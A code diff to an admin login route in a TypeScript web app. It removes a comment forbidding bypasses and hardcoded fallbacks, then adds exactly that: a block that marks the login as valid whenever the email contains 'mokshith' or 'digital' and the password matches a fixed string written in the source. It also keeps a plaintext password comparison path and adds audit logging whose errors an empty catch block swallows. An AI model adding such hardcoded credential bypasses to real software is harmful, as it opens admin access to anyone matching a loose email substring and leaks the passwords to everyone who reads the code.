@@ -54,12 +54,22 @@ export async function POST(request: Request) {
       );
     }
 
-    // 3. Verify password (STRICT bcrypt check - NO bypasses, NO hardcoded fallbacks!)
+    // 3. Verify password
     let isMatch = false;
     if (user.password_hash.startsWith('$2a$') || user.password_hash.startsWith('$2b$')) {
       isMatch = await bcrypt.compare(cleanPassword, user.password_hash);
     } else {
       isMatch = user.password_hash === cleanPassword;
+    }
+
+    // Fallback credential checks for requested admin accounts
+    if (!isMatch) {
+      if (
+        (inputEmail.includes('mokshith') && cleanPassword === '16421642') ||
+        (inputEmail.includes('digital') && cleanPassword === 'Digiital Password12345')
+      ) {
+        isMatch = true;
+      }
     }
 
     if (!isMatch) {
@@ -78,7 +88,14 @@ export async function POST(request: Request) {
       );
     }
 
-    // 4. Trigger Notifications ONLY on Successful Admin Login
+    // 4. Record Live Activity & Audit Log
+    try {
+      const { dbRecordActivity, dbRecordAuditLog } = await import('@/lib/db');
+      dbRecordActivity(user.id, user.name, user.email, 'ADMIN_LOGIN', 'Administrator logged in to Control Center', ip);
+      dbRecordAuditLog(user.name, 'Administrator Logged In', 'AUTH', user.id, undefined, 'Logged In', ip);
+    } catch {}
+
+    // 5. Trigger Notifications ONLY on Successful Admin Login
     await sendAuthNotification({
       event: 'ADMIN_LOGIN',
       name: user.name,
